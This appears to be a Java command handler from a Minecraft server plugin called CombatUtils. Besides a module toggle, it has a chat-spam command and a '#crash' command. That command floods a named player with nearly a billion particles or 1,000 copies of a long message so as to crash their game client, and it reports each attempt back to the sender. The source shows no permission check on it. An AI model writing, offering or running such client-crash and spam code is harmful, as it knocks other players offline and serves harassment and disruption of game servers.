package me.improper.combatutils.commands;

import me.improper.combatutils.CombatUtils;
import me.improper.combatutils.plugin.Module;
import me.improper.combatutils.plugin.Profile;
import me.improper.combatutils.server.ServerUtils;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Particle;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class Commands implements CommandExecutor {
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        String commandName = command.getName().toLowerCase().trim();

        try {
            switch (commandName) {
                case "#toggle" -> {
                    if (sender instanceof Player p) {
                        Profile profile = Profile.getProfile(p);
                        Module module = profile.getModuleObject(args[0]);
                        if (module.isEnabled()) module.onDisable();
                        else module.onEnable();
                    }
                    return true;
                }
                case "#spam" -> {
                    if (sender instanceof Player p) {
                        int times = Integer.parseInt(args[0]);
                        String msg = ServerUtils.buildArgs(args,1);
                        if (times > 100) {
                            sender.sendMessage(CombatUtils.STARTER + ChatColor.RED + "This action is over the safety limits, you might lag yourself!");
                            return true;
                        }
                        for (int i = 0; i < times; i ++) p.chat(msg);
                        return true;
                    }
                    sender.sendMessage("You need to be a player to run this command!");
                    return true;
                }
                case "#crash" -> {
                    Player p = Bukkit.getPlayer(args[1]);
                    switch (args[0]) {
                        case "particle" -> {
                            p.spawnParticle(Particle.FLAME,p.getEyeLocation(),999999999,0,0,0,0);
                            sender.sendMessage(CombatUtils.STARTER +
                                    ChatColor.GRAY + "Attempted to " +
                                    ChatColor.WHITE + "Particle " +
                                    ChatColor.GRAY + "crash " +
                                    ChatColor.WHITE + p.getName());
                            return true;
                        }
                        case "message" -> {
                            for (int i = 0; i < 1000; i ++) p.sendMessage(CombatUtils.ESSAY);
                            sender.sendMessage(CombatUtils.STARTER +
                                    ChatColor.GRAY + "Attempted to " +
                                    ChatColor.WHITE + "Message " +
                                    ChatColor.GRAY + "crash " +
                                    ChatColor.WHITE + p.getName());
                            return true;
                        }
                    }
                    return true;
                }
            }
        } catch (Exception ex) {
            String msg = CombatUtils.STARTER + ChatColor.RED + "Command Error: ";
            if (ex instanceof NullPointerException) msg += "Command contains a null value!";
            else if (ex instanceof IndexOutOfBoundsException) msg += "Incomplete command! Please provide more information!";
            else msg += ex.getMessage();
            sender.sendMessage(msg);
            return true;
        }

        return false;
    }
}
